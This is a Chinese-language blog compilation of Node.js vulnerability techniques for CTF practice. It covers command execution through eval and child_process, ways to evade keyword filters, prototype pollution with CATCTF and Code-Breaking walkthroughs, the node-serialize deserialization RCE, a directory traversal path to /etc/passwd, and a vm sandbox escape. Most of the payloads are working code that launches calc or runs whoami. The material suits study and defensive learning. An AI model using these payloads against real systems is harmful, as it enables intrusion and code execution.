---
title: "nodejs漏洞"
onlyTitle: true
date: 2024-9-30 10:41:58
categories:
- nodejs
tags:
- nodejs
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8102.png
---



抄一份nodejs的漏洞合集

https://xz.aliyun.com/t/13065#toc-15

| S.No | Javascript                                                   | NodeJS                                                       |
| ---- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| 1    | Javascript是一种编程语言，用于在网站上编写脚本。             | NodeJS是一种Javascript的运行环境。                           |
| 2    | Javascript只能在浏览器中运行。                               | 在NodeJS的帮助下，可以在浏览器外运行Javascript。             |
| 3    | Javascript基本上是在**客户端**使用。                         | NodeJS主要用在**服务器**端。                                 |
| 4    | Javascript有足够的能力来添加HTML和玩弄DOM。                  | Nodejs不具备添加HTML标签的能力。                             |
| 5    | Javascript可以在任何浏览器引擎中运行，比如Safari中的JS core和Firefox中的Spidermonkey。 | V8是node.js内部的Javascript引擎，可以解析和运行Javascript。  |
| 7    | Javascript的一些框架有RamdaJS、TypedJS等。                   | Nodejs的一些模块有Lodash、express等。这些模块需要从npm导入。 |
| 8    | Javascript是ECMA脚本的升级版，使用Chrome的V8引擎，用C++编写。 | Nodejs是用C、C++和Javascript编写的。                         |

## toUpperCase()漏洞

toUpperCase()转大写，特殊字符替代

`"ı".toUpperCase() == 'I'` `"ſ".toUpperCase() == 'S'`

toLowerCase()转小写

`"K".toLowerCase() == 'k'`

### 弱类型比较

如果需要满足：

```js
a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)
```

看下面case

```js
a={'x':'1'}
b={'x':'2'}

console.log(a+"flag{xxx}")
console.log(b+"flag{xxx}")
//输出
//[object Object]flag{xxx}
//[object Object]flag{xxx}
```

即传入`a[x]=1&b[x]=2`即可满足要求



## 命令执行

### eval（）

如下代码

```js
var express = require("express");
var app = express();

app.get('/eval',function(req,res){
    res.send(eval(req.query.q));
    console.log(req.query.q);
})
//参数 a 通过 get 传参的方式传入运行，我们传入参数会被当作代码去执行。

var server = app.listen(8888, function() {
    console.log("应用实例，访问地址为 http://127.0.0.1:8888/");
})
```

### settimeout()

`settimeout(function,time)`，该函数作用是两秒后执行函数，function 处为我们可控的参数。

```js
setTimeout(()=>{
  console.log("console.log('Hacked')");
},2000);
```

### setinterval()

`setinterval (function,time)`，每隔两秒执行一次代码

### Function()

`Function(string)()`，类似php的create_function，创建函数并立即调用

```js
var aaa=Function("console.log('Hacked')")();
```

### child_process模块

child_process模块可以创建子进程，进行命令执行

* exec。调用/bash.sh，与execSync用法相同

```js
require('child_process').exec('calc');
```

* execFile，与execFileSync用法相同

```js
require('child_process').execFile("calc",{shell:true});
```

* fork

```js
require('child_process').fork("calc");
```

* spawn，与spawnSync用法相同

```js
require('child_process').spawn("calc",{shell:true});
```

* fs.writeFile，writeFileSync写文件

```js
require('fs').writeFileSync('input.txt',"dasdsadsa");
//require('fs').writeFile('input.txt',"dasdsadsa",(err)=>{});
```



### fs.readFileSync

使用`fs.readFileSync`进行文件读取，需要满足以下条件

- 有`href`且非空
- 有`origin`且非空
- `protocol` 等于`file:`
- 有`hostname`且等于空(Windows下非空的话会进行远程加载)
- 有`pathname`且非空(读取的文件路径)

```js
?file[href]=a&file[origin]=1&file[protocol]=file:&file[hostname]=&file[pathname]=读取的文件
```

### 绕过过滤

* 过滤`.`

`[]`代替`.`

```java
require('child_process')["exec"]('calc');
```

* 过滤字符串

拼接

```java
require('child_process')["ex"+"ec"]('calc');
```

十六进制

```js
require('child_process')["\x65\x78\x65\x63"]('calc');
```

unicode

```js
require('child_process')["\u0065\u0078\u0065\u0063"]('calc');
```

base64

```js
eval(Buffer.from('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpWyJleGVjIl0oJ2NhbGMnKTs=','base64').toString());
//require('child_process')["exec"]('calc');
```

ES6模板绕过

```js
require('child_process')[`${`${`exe`}cSync`}`"]('calc');
```

>ES6特性可以用反引号代替括号执行函数，也能代替单引号和双引号，反引号内能插入变量
>
>```js
>var node = "nodejs";
>console.log`hello${node}world`;
>//输出 ['hello','world'] nodejs
>```
>
>之所以这么输出，是因为console参数为hello${node}world，而不是"hello${node}world"，前者是个数组

concat拼接

```js
require('child_process')["exe".concat("c")]('calc');
```

Object.values

> 类似SSTI

```js
Object.values(require('child_process'))[4]('calc').toString();
```

![20231118120211-40213400-85c7-1](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/20231118120211-40213400-85c7-1.png)

过滤require关键字

```js
global.process.mainModule.constructor._load('child_process')
```

## js自执行匿名函数

这种函数在声明时就会立即执行一次

```js
(function () {
  // …
})();

(function () {
  // …
}());

(() => {
  // …
})();

(async () => {
  // …
})();

Function(参数列表,code).apply(参数)//code为另一函数
```

case：

```js
function greet(greeting, name) {
    console.log(greeting + ', ' + name + '!');
}

var args = ['Hello', 'World'];

greet.apply(null, args);
```





## 原型链污染

在2022年，在CsbN写过一篇CATCTF的javascript原型链污染，没想到nodejs很多漏洞都是这个

JavaScript中，每个对象（object）都有一个私有属性指向另一个名为**原型**（prototype）的对象。原型对象也有一个自己的原型，层层向上直到一个对象的原型为 `null`。根据定义，`null` 没有原型，并作为这个**原型链**（prototype chain）中的最后一个环节。

体现到代码上，就是：

* 每一个`原型对象`都有一个`prototype`属性，prototype 属性可以向对象添加属性和方法。

```js
object.prototype.name=value
```

* 每一个`实例对象`都有一个`__proto__`属性，这个实例属性指向对象的原型对象(即原型)。

访问原型对象的几种方法：

```js
objectname["__proto__"]
objectname.__proto__
objectname.constructor.prototype
```

抄个图，一眼懂。

![image-20240927151537978](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927151537978.png)

不同对象所生成的原型链如下(部分)：

```js
var o = {a: 1};//o是个对象，有个a字段（属性）
// o对象直接继承了Object
// 原型链： o ---> Object ---> null


var a = ["yo", "whadup", "?"];
// 数组都继承于 Array
// 原型链：
// a ---> Array ---> Object ---> null

function f(){
  return 2;
}
// 函数都继承于 Function
// 原型链：
// f ---> Function ---> Object ---> null
```

给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性。

如下代码

```javascript
object1 = {"a":1, "b":2};
object1.__proto__.foo = "Hello World";
console.log(object1.foo);
object2 = {"c":1, "d":2};
console.log(object2.foo);
//输出两个Hello World
```

### merge原型链污染

merge操作会导致原型链污染

假设有一个merge对象的函数

```js
function merge(target, source) {
    for (let key in source) {
        if (key in source && key in target) {
            merge(target[key], source[key])
        } else {
            target[key] = source[key]
        }
    }
}
```

下面的代码会污染到object3吗

```js
let object1 = {}
let object2 = {"a": 1, "__proto__": {"b": 2}}
merge(object1, object2)
console.log(object1.a, object1.b)

object3 = {}
console.log(object3.b)
//1 2
```

因为在给object2赋值的时候，`__proto__`代表object2的原型，也就是说`object2 = {"a": 1, "__proto__": {"b": 2}}`，是把object2的原型从Object换成了`{"b": 2}`对象。o3并没有继承`{"b": 2}`，而是继承的Object，所以没有被污染。

简单来说就是`__proto__`没有被当成键名，而是被解析了



在JSON解析的情况下，`__proto__`会被认为是一个真正的“键名”，而不代表“原型”。在赋值时等于`o2.__proto__.b=2`，所以在遍历object2的时候会存在这个键。`console.log(o3.b)`输出`2`

```js
let o1 = {}
let o2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')
merge(o1, o2)
console.log(o1.a, o1.b)

o3 = {}
console.log(o3.b)
//1 2
//2
```

在下列库中，均存在原型链污染问题

**1. Merge function**

- hoek
   **hoek.merge**
   **hoek.applyToDefaults**
   Fixed in version 4.2.1
   Fixed in version 5.0.3

- lodash
   **lodash.defaultsDeep**
   **lodash.merge**
   **lodash.mergeWith**
   **lodash.set**
   **lodash.setWith**
   Fixed in version 4.17.5

- merge
   **merge.recursive**
   Not fixed. Package maintainer didn’t respond to the disclosure.

- defaults-deep
   **defaults-deep**
   Fixed in version 0.2.4

- merge-objects
   **merge-objects**
   Not fixed. Package maintainer didn’t respond to the disclosure.

- assign-deep
   **assign-deep**
   Fixed in version 0.4.7

- merge-deep
   **Merge-deep**
   Fixed in version 3.0.1

- mixin-deep
   **mixin-deep**
   Fixed in version 1.3.1

- deep-extend
   **deep-extend**
   Not fixed. Package maintainer didn’t respond to the disclosure.

- merge-options
   **merge-options**
   Not fixed. Package maintainer didn’t respond to the disclosure.

- deap
   **deap.extend**
   **deap.merge**
   **deap**
   Fixed in version 1.0.1

- merge-recursive

  **merge-recursive.recursive**

  Not fixed. Package maintainer didn’t respond to the disclosure.

**2. Clone**

- deap
   **deap.clone**
   Fixed in version 1.0.1

**3. Property definition by path**

- lodash
   **lodash.set**
   **lodash.setWith**
- pathval
   **pathval.setPathValue**
   **pathval**
- dot-prop
   **dot-prop.set**
   **dot-prop**
- object-path
   **object-path.withInheritedProps.ensureExists**
   **object-path.withInheritedProps.set**
   **object-path.withInheritedProps.insert**
   **object-path.withInheritedProps.push**
   **object-path**



### CATCTF 2022 wife

靶场：https://adworld.xctf.org.cn/challenges/details?hash=e5ba95f8-884a-11ed-ab28-000c29bc20bf&task_category_id=3

注册部分的代码：

```js
app.post('/register', (req, res) => {
    let user = JSON.parse(req.body)
    if (!user.username || !user.password) {
        return res.json({ msg: 'empty username or password', err: true })
    }
    if (users.filter(u => u.username == user.username).length) {
        return res.json({ msg: 'username already exists', err: true })
    }
    if (user.isAdmin && user.inviteCode != INVITE_CODE) {
        user.isAdmin = false
        return res.json({ msg: 'invalid invite code', err: true })
    }
    let newUser = Object.assign({}, baseUser, user)
    users.push(newUser)
    res.json({ msg: 'user created successfully', err: false })
})
```

json解析后，利用Object.assign()创建子类newUser，push进users

这里传入payload:`"__proto__"{"isAdmin":true}`造成原型链污染，生成的user用户拥有isAdmin=true
![在这里插入图片描述](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/df570f457215733b422d11b049586779.png)

### Code-Breaking 2018 Thejs

http://code-breaking.com/puzzle/9/

npm下不了express的，执行`npm i gulp-connect@5.6.1`

然后编辑配置

![image-20240927180031882](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927180031882.png)

重点看下server.js，定义了一个处理根路径请求的路由，调用lodashs.merge对POST body和data进行处理

![image-20240927195810158](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927195810158.png)

而data的定义在上一排

data 包含两个属性：language 和 category，它们都是数组类型。

如果会话中没有 data，则初始化为` {language: [], category: []}`。否则从session中提取

而且也满足JSON解析请求体，使用了body-parser处理URL编码和JSON请求体，已经满足了原型链污染的条件了

![image-20240927201011765](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927201011765.png)

原型链污染是有了，还没找到能命令执行的点

ok，通读一下代码

先设置session，再定义了一个EJS模板引擎。该模板引擎读取文件，并用lodash库将文件编译为函数。把options参数传递给编译后的函数

再app.set设置了视图目录为./views，并把刚才定义的ejs指定为视图引擎

最后是处理根目录请求的方法。刷新data数据后传到index，这里index是模板文件名，实际上包含扩展名是index.ejs。

因此，data更新后，Express会自动在views目录查找index.ejs文件，并调用lodash.template把该文件转为函数，把`{ language: data.language, category: data.category } `中的数据渲染进模板中的相应位置。

页面最终通过lodash.template进行渲染，你可以在lodash.js templates函数查看逻辑，也可以在lodash/template.js，也可以打上断点跟踪

看到有个自执行函数：

![image-20240927220053182](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927220053182.png)

控制sourceURL或者source就能执行任意代码

向上一看，我操，一堆给source赋值的代码。

sourceURL就很干净，options默认为undefined，如果我们能污染options.sourceURL

`sourceURL = '//# sourceURL= options.sourceURL'`，就能执行任意代码

![image-20240927220958006](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927220958006.png)

从控制台看到options是Object

![image-20240927222038209](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927222038209.png)

我们通过之前的根目录路由，污染Object，使其sourceURL属性为

```js
{"__proto__":{"sourceURL":"\nglobal.process.mainModule.constructor._load('child_process').exec('calc')//"}}
```

记得前面加换行，因为`//# sourceURL= options.sourceURL`前面有注释，尾部也记得加`//`，注释后面的代码，避免出错。由于Function 环境下没有 require 函数，直接使用require(‘child_process’) 会报错

注意！Content-Type需要改为`application/json`



## node-serialize 反序列化RCE(CVE-2017-5941)

漏洞版本：node-serialize模块==0.0.4

```shell
npm install node-serialize@0.0.4
```

漏洞代码位于node_modules\node-serialize\lib\serialize.js中s

直接看到执行代码的地方：

![image-20240928211918215](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240928211918215.png)

读一下这个函数：

* 如果输入为字符串，用JSON.parse转换为对象
* 遍历对象的属性，递归反序列化嵌套的对象
* 如果属性值以`_$$ND_FUNC$$_`开头，则执行eval

![image-20240928214539463](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240928214539463.png)

eval前后用括号包裹，如果obj是外部参数，那我们中间是不是可以套一个自执行函数？

```js
(function () {
  // …
}());
```

如下code就能弹计算器

```js
var node_serialize = require('node-serialize')
obj = {"any":"_$$ND_FUNC$$_function(){require('child_process').exec('calc');}()"}
node_serialize.unserialize(obj)
```



## CVE-2017-14849目录穿越

- Node.js 8.5.0 + Express 3.19.0-3.21.2
- Node.js 8.5.0 + Express 4.11.0-4.15.5

遇到了试一下就完了

```js
/static/../../../a/../../../../etc/passwd
```



## vm沙箱逃逸

用vm库可以创建一个沙箱sandbox，阻止沙箱程序影响到进程

如下代码，创建沙箱执行代码

```js
const vm = require('vm');
const sandbox = {};
const script = new vm.Script("this.constructor.constructor('return this.process.env')()");
const context = vm.createContext(sandbox);
env = script.runInContext(context);
console.log(env);
```

创建vm环境时，要先初始化一个对象sandbox。这个对象就是vm脚本执行的全局环境context，Script中的this，在执行`script.runInContext(context);`时就指的sandbox

sandbox.constructor指sanbox的构造函数，也就是Object

sandbox.constructor.constructor指Object.constructor，也就是Function，表示Object的构造函数对象本身

Function('return this.process.env')()就是个自执行函数

即遇到vm沙箱，也能执行沙箱外的代码。上述代码能用runInNewContext代替

```js
const vm = require("vm");
const env = vm.runInNewContext(`this.constructor.constructor('return this.process.env')()`);
console.log(env);
```

配合`chile_process.exec()`就可以执行任意命令

```js
const vm = require("vm");
const env = vm.runInNewContext(`const process = this.constructor.constructor('return this.process')();
process.mainModule.require('child_process').execSync('whoami').toString()`);
console.log(env);
```



## CVE-2019-10758:mongo-express RCE

```js
npm install mongo-express@0.53.0 
```

vm逃逸

https://xz.aliyun.com/t/7056
